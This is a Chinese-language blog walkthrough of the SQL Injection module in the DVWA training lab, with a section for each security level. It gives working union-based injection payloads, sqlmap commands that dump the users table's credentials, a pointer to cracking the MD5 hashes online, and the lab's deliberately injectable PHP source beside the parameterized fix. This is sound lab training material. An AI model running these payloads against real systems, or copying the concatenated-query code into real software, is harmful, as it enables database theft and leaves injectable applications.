---
title: "网络安全 DVWA通关指南 SQL Injection(SQL注入)"
date: 2024-09-26 12:25:03
category: "DVWA靶场"
categories: 
  - "DVWA靶场"
tags:
- "web安全"
- "sql"
- "安全"
- "网络安全"
- "SQL注入"
- "数据库"
- "DVWA"
---

## DVWASQLInjection

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735688.jpeg)





---

参考文献

- [WEB 安全靶场通关指南](https://www.cnblogs.com/linfangnan/p/13994655.html#dvwa-%E9%9D%B6%E5%9C%BA)



---

> **SQL注入漏洞基本原理** 
> 
> Web应用程序对用户输入的数据校验处理不严或者根本没有校验，致使用户可以拼接执行SQL命令。
> 
> 可能导致数据泄露或数据破坏，缺乏可审计性，甚至导致完全接管主机。
> 
> **根据注入技术分类有以下五种：** 
> 
> > 布尔型盲注：根据返回页面判断条件真假
> > 
> > 时间型盲注：用页面返回时间是否增加判断是否存在注入
> > 
> > 基于错误的注入：页面会返回错误信息
> > 
> > 联合查询注入：可以使用union的情况下
> > 
> > 堆查询注入：可以同时执行多条语句
> 
> **防御方法** 
> 
> 使用参数化查询。
> 
> 数据库服务器不会把参数的内容当作 `SQL` 指令的一部分来拼接执行；
> 
> 而是在数据库完成 `SQL` 指令的编译后才套用参数运行(预编译)。
> 
> 避免数据变成代码被执行，时刻分清代码和数据的界限。

### Low

**一、判断提交方式** 

在User ID中输入数字1，提交后发现，在URL地址栏出现了提交的参数，由此可以判断提交方式为get方式。

提问：get和post提交方式对SQL注入的实施有什么影响？

 ![image-20240408153605723](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735689.png)

**二、判断服务器处理类型（数字型或字符型）** 

加单引号，提交 `1'` ，出现报错信息，显示多出一个单引号，可以确定为字符型注入

 ![image-20240411212414415](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735690.png)

**三、判断注入点** 

提交 `1' or 1=1#` 语句，结果返回了全部的内容，可以判断存在注入点

```sql
1' or 1=1#
```

 ![image-20240411213036653](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735691.png)

**四、判断列数** 

使用 `order by` 语句判断目标数据库表中的列数，依次提交 `1' order by 1#` 语句，数字从大到小，当出现报错信息后确定列数。

```sql
1' order by 1#
1' order by 2#
1' order by 3# 
```

 ![image-20240411214439810](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735692.png)

 ![image-20240411214409610](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735693.png)

 ![image-20240411214320827](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735694.png)

当提交 `1' order by 3#` 时出现报错信息，说明目标数据库表中的列数为2

**五、提取库名、表名、字段名、值** 

1、提取库名

依据前一步得到的列数构建注入语句，得到数据库名dvwa

```sql
1' union select 1,database()#
```

 ![image-20240411214816515](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735695.png)

2、提取表名

通过注入攻击来获取名为’dvwa’的数据库中的所有表名

```sql
1' union select 1,table_name from information_schema.tables where table_schema='dvwa'#

//information_schema 是一个特殊的系统数据库，其中包含了所有用户创建的数据库以及这些数据库中的表的信息。tables 表提供了关于所有表的详细信息，如表名、表类型等。
//"1,table_name"中的'1'是一个占位符，用于模拟与原始查询返回相同数量的列，以便UNION操作成功执行。
```

当提交注入语句时，可能出现如下错误信息：

```
Illegal mix of collations for operation 'UNION'
```

 ![image-20240411220050884](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735696.png)

这是由于MySQL在执行 `UNION` 操作时遇到的不同字符集之间的冲突报错。

解决方法：打开CMD，登录MySQL的dvwa数据库，修改first_name和last_name字段的字符集

```mysql
alter table users modify first_name varchar(15) character set utf8 collate utf8_general_ci;
alter table users modify last_name varchar(15) character set utf8 collate utf8_general_ci;
//将first_name和last_name字段的字符集都设置为了utf8，并指定了排序规则为utf8_general_ci
```

修改完毕后，命令执行成功

 ![image-20240411221106229](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735697.png)

3、提取字段名

通过注入攻击获取数据库中特定表（本例中为 `users` 表）的所有字段名。

```sql
1' union select 1,column_name from information_schema.columns where table_name='users'#
```

 ![image-20240412083706100](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735698.png)

4、提取值

从数据库表 `users` 中提取 `user` 和 `password` 字段的数据

```sql
1' union select user,password from users#
```

执行命令出现同样的字符编码问题，解决方法还是修改字段的字符集

 ![image-20240412083801374](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735699.png)

```mysql
alter table users modify user varchar(15) character set utf8 collate utf8_general_ci;
alter table users modify password varchar(50) character set utf8 collate utf8_general_ci;
```

执行成功得到用户和密码的数据，密码为32位小写MD5，可以通过 [在线工具](https://www.cmd5.com/default.aspx) 解密

 ![image-20240412084253957](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735700.png)

 ![image-20240412111534464](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735701.png)

**六、SQLmap工具使用** 

```
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low"
```

 ![image-20240412103446366](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735702.png)

 ![image-20240412103645411](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735703.png)

 ![image-20240412104023272](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735704.png)

1、提取库名

```
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" --dbs
```

 ![image-20240412104144581](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735705.png)

2、提取表名

```
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" -D dvwa --tables
```

 ![image-20240412104236250](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735706.png)

3、提取字段名

```
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=265uqla8dabr5jt04llgsk4sc9; security=low" -D dvwa -T users --columns
```

 ![image-20240412104324776](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735707.png)

4、提取值

```
sqlmap -u "http://dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=i0ssj777jur6gqb9af6bd111tn; security=low" --batch -D dvwa -T users -C user,password --dump
```

 ![image-20240603085905398](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735708.png)

**七、分析后台脚本** 

```php+HTML
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
	// Get input
	$id = $_REQUEST[ 'id' ];

	// Check database
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

```php+HTML
<?php

// 检查是否有"Submit"按钮被点击
if( isset( $_REQUEST[ 'Submit' ] ) ) {
        // 获取用户输入的ID
        $id = $_REQUEST[ 'id' ];

        // 构建SQL查询语句
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
        // 执行SQL查询
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        // 处理查询结果
        while( $row = mysqli_fetch_assoc( $result ) ) {
                // 获取查询结果中的名字和姓氏
                $first = $row["first_name"];
                $last  = $row["last_name"];
    
                // 拼接输出结果
                $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    
        // 关闭数据库连接
        mysqli_close($GLOBALS["___mysqli_ston"]);

}

?>
```

### Medium

1、修改电脑代理服务器IP设置为127.0.0.1，端口设置为8888，Bur调整代理参数与电脑代理一致

 ![image-20240412094734133](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735710.png)

 ![image-20240412095237028](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735711.png)

 ![image-20240412094536046](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735712.png)

2、在DVWA中尝试提交一个ID，在BurpSuite的repeater中查看捕获到的提交信息。使用BurpSuite的repeater模块可以重复发送数据，查看返回数据。

 ![image-20240412095327893](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735713.png)

 ![image-20240412095418437](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735714.png)

 ![image-20240412095516476](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735715.png)

 ![image-20240412095727503](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735716.png)

3、确认列数

```
4 order by 1#
4 order by 2#
4 order by 3#
```

 ![image-20240412095859327](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735717.png)

 ![image-20240412095934153](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735718.png)

4、库、表、字段、值

```
4 union select 1,database()#
//得到库名
4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
//得到表名
4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
//得到字段
4 union select user,password from users#
//得到值
```

提取库名

```
4 union select 1,database()#
```

 ![image-20240412101400469](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735719.png)

提取表名

注入语句发现单引号被转义，使用BurpSuite的Decoder模块，将 `'dvwa'` 转为16进制，自行添加 `0x` 

```
4 union select 1,table_name from information_schema.tables where table_schema='dvwa'#
4 union select 1,table_name from information_schema.tables where table_schema=0x64767761#
```

 ![image-20240412101948084](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735720.png)

 ![image-20240412102504354](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735721.png)

 ![image-20240412102654211](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735722.png)

提取字段名

```
4 union select 1,column_name from information_schema.columns where table_schema=0x64767761 and table_name=0x7573657273#
```

 ![image-20240412102804247](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735723.png)

提取user、password的值

```
4 union select user,password from users#
```

 ![image-20240412102914074](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735724.png)

SQLmap工具使用

将第一步抓到的数据保存在桌面，命名为1.txt文件

 ![image-20240603112004596](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735725.png)

使用 `-r` 参数指定文件路径。

```
sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium" --batch --dbs
// -r REQUESTFILE      从文件中读取 HTTP 请求
```

 ![image-20240603101812626](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735726.png)

操作步骤与前面一致，最后得到user、password数据

```
sqlmap -r C:\Users\yuexuan\Desktop\1.txt  --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=medium" --batch -D dvwa -T users -C user,password --dump
```

 ![image-20240603102226671](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735727.png)

```php
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
	// Get input
	$id = $_POST[ 'id' ];

	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
    //ysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。
    //在以下字符前添加反斜线：\x00、\n、\r、\、'、" 和 \x1a.

	$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Display values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

### High

1、点击链接弹出小窗，提交1，使用BurpSuite抓包。

 ![image-20240603092627559](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735728.png)

 ![image-20240603092835322](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735729.png)

尝试放包，回显信息出现在原页面

 ![image-20240603093053482](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735730.png)

2、注入方式与Low、Medium级别一致，最后得到user、password数据

```
1' union select user,password from users#
```

 ![image-20240603093607403](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735731.png)

SQLmap工具使用

因为提交数据与回显数据的页面不同，所以需要添加第二个回显地址。将第一步抓到的数据保存在桌面，命名为1.txt文件，使用 `-r` 参数指定文件路径。 `--second-url` 参数指定会先页面URL。

```
sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabilities/sqli/" --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high" --batch --dbs
```

 ![image-20240603100335290](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735732.png)

操作步骤与前面一致，最后得到user、password数据

```
sqlmap -r C:\Users\yuexuan\Desktop\1.txt --second-url "http://dvwa/vulnerabilities/sqli/" --cookie "PHPSESSID=ef4ln5lm529kdmhri3meltn9lk; security=high" --batch -D dvwa -T users -C user,password --dump
```

 ![image-20240603101120077](https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165735733.png)

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
	// Get input
	$id = $_SESSION[ 'id' ];

	// Check database
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
	$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);		
}

?>
```

### Impossible

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
       // Check the database
       $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
       $data->bindParam( ':id', $id, PDO::PARAM_INT );
       $data->execute();
       $row = $data->fetch();

       // Make sure only 1 result is returned
       if( $data->rowCount() == 1 ) {
          // Get values
          $first = $row[ 'first_name' ];
          $last  = $row[ 'last_name' ];

          // Feedback for end user
          $html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
       }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```